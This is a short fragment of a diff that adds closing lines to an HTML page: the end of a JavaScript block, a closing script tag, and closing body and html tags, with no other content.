+    });
+</script>
+
+
+
+</body>
+</html>
